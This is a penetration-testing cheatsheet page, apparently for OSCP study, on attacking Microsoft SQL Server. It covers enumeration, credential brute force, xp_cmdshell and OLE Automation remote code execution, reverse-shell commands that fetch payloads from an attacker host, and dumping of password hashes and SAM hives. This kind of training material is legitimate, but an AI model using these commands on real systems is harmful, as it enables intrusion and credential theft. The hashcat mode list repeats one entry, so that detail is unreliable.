# MSSQL (Microsoft SQL Server)

> Part of [Databases](./README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Default and weak credentials](#3-default-and-weak-credentials)
- [4. Known CVEs](#4-known-cves)
- [5. Exploitation](#5-exploitation)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Port and service

Default port **1433** (TCP). UDP **1434** is the SQL Server Browser service.

```bash
# Version + instance info
nmap -sV -p 1433 <TARGET>
nmap -p 1433 --script ms-sql-info,ms-sql-config <TARGET>

# UDP browser (instance discovery)
nmap -sU -p 1434 --script ms-sql-info <TARGET>
```

Expected output:

```text
1433/tcp open  ms-sql-s   Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   Windows server name: SQL01
|   Instance name: MSSQLSERVER
|   Version: 15.00.2000.00
```

### 1.2 Version to CVE mapping

| Version | Notable CVEs |
|---------|--------------|
| SQL Server 2000 | CVE-2000-1209 (xp_cmdshell default) |
| SQL Server 2008 R2 | CVE-2012-1882 |
| SQL Server 2012-2019 | CVE-2021-1636, CVE-2020-0618 (RCE via SSRS) |
| SQL Server 2019-2022 | CVE-2023-23396, CVE-2024-28956 |

---

## 2. Enumeration

### 2.1 Check `xp_cmdshell` status

`xp_cmdshell` is disabled by default on modern SQL Server (2005+), but can be re-enabled by a sysadmin.

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).
> This determines whether direct OS command execution is available.

Expected output (disabled):

```text
name         minimum  maximum  config_value  run_value
xp_cmdshell  0        1        0             0
```

### 2.2 Enumerate databases, users, roles

```sql
-- Databases
SELECT name FROM sys.databases;

-- Current user + sysadmin check
SELECT SUSER_NAME(), IS_SRVROLEMEMBER('sysadmin');

-- All logins
SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');

-- All database users
SELECT name FROM sys.database_principals;
```

### 2.3 Find interesting tables

```sql
USE <DBNAME>;
SELECT table_schema, table_name FROM information_schema.tables;

-- Find columns with password/secret/token in name
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%'
   OR column_name LIKE '%secret%'
   OR column_name LIKE '%token%';
```

### 2.4 Impersonation check

```sql
-- Can current user impersonate someone else?
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

---

## 3. Default and weak credentials

### 3.1 Common defaults

| User | Password | Notes |
|------|----------|-------|
| sa | (empty) | Legacy default |
| sa | sa | Common in old installs |
| sa | password | Classic weak |
| sa | P@ssw0rd | Enterprise default |
| sa | Password123 | Common in dev |

### 3.2 Brute force

```bash
# Hydra
hydra -l sa -P /usr/share/wordlists/rockyou.txt <TARGET> mssql

# nmap NSE
nmap -p 1433 --script ms-sql-brute <TARGET>

# Metasploit
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS <TARGET>; set USERNAME sa; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

### 3.3 Connect

```bash
# impacket-mssqlclient
impacket-mssqlclient <USER>:<PASS>@<TARGET>

# sqsh
sqsh -S <TARGET> -U sa -P '<PASS>'

# sqlcmd (Windows)
sqlcmd -S <TARGET> -U sa -P '<PASS>'
```

---

## 4. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2012-1882 | SQL Server 2000/2005/2008 | DoS in TDS parsing | https://nvd.nist.gov/vuln/detail/CVE-2012-1882 |
| CVE-2020-0618 | SQL Server 2012-2019 (SSRS) | RCE via SSRS report viewer | https://nvd.nist.gov/vuln/detail/CVE-2020-0618 |
| CVE-2021-1636 | SQL Server 2016-2019 | Elevation of privilege | https://nvd.nist.gov/vuln/detail/CVE-2021-1636 |
| CVE-2023-23396 | SQL Server 2019-2022 | RCE via crafted query | https://nvd.nist.gov/vuln/detail/CVE-2023-23396 |
| CVE-2024-28956 | SQL Server 2019-2022 | RCE via network | https://nvd.nist.gov/vuln/detail/CVE-2024-28956 |

---

## 5. Exploitation

### 5.1 Enable xp_cmdshell (sysadmin required)

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Expected output:

```text
output
--------------------------------------------------
nt authority\system
```

### 5.2 Reverse shell via xp_cmdshell

```sql
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://<LHOST>/shell.ps1'')"';
```

Or directly with `nc.exe`:

```sql
EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/nc.exe C:\Windows\Temp\nc.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe <LHOST> <LPORT>';
```

### 5.3 OLE Automation (alternative RCE)

If `xp_cmdshell` is blocked but OLE Automation is enabled:

```sql
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://<LHOST>/shell.ps1'')';
```

### 5.4 Impersonation (privilege escalation)

```sql
-- Find impersonatable logins
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa (if allowed)
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
-- Now run xp_cmdshell
EXEC xp_cmdshell 'whoami';
REVERT;
```

### 5.5 Linked servers

```sql
-- List linked servers
EXEC sp_linkedservers;

-- Execute on a linked server
SELECT * FROM OPENQUERY(<LINKED>, 'SELECT @@version');
EXEC ('EXEC xp_cmdshell ''whoami''') AT <LINKED>;
```

---

## 6. Post-exploitation

### 6.1 Dump password hashes

```sql
-- SQL logins with password hashes
SELECT name, password_hash FROM sys.sql_logins;
```

`password_hash` is in `0x0200` format (SHA-512 + salt).

### 6.2 Crack hashes

Hashcat mode:
- `-m 1731` - MSSQL 2012/2014
- `-m 132` - MSSQL 2000
- `-m 1731` - MSSQL 2012+

```bash
hashcat -m 1731 mssql_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.3 Windows credential extraction

```sql
-- Read SAM/SYSTEM (requires sysadmin + xp_cmdshell)
EXEC xp_cmdshell 'reg save HKLM\SAM C:\Windows\Temp\SAM';
EXEC xp_cmdshell 'reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM';
```

Then exfil and use `secretsdump.py` locally.

### 6.4 UNC path capture (NetNTLM hash)

```sql
EXEC xp_dirtree '\\<LHOST>\share';
```

Capture with `Responder`, crack with hashcat mode `5600`.

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the `impacket-mssqlclient` login that proves credential access (`SELECT @@version` output).

> [!IMPORTANT]
> OSCP report: screenshot the moment of RCE via `xp_cmdshell` (`whoami` output showing `nt authority\system`).

> [!IMPORTANT]
> OSCP report: screenshot `sys.sql_logins` dump or `responder` capture that yields credentials for lateral movement.

---

## 8. References

- Microsoft SQL Server docs - https://learn.microsoft.com/en-us/sql/sql-server/
- HackTricks - MSSQL - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- PayloadsAllTheThings - MSSQL - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
- CVE-2012-1882 - https://nvd.nist.gov/vuln/detail/CVE-2012-1882
- CVE-2020-0618 - https://nvd.nist.gov/vuln/detail/CVE-2020-0618
- CVE-2021-1636 - https://nvd.nist.gov/vuln/detail/CVE-2021-1636
- CVE-2023-23396 - https://nvd.nist.gov/vuln/detail/CVE-2023-23396
- CVE-2024-28956 - https://nvd.nist.gov/vuln/detail/CVE-2024-28956

---
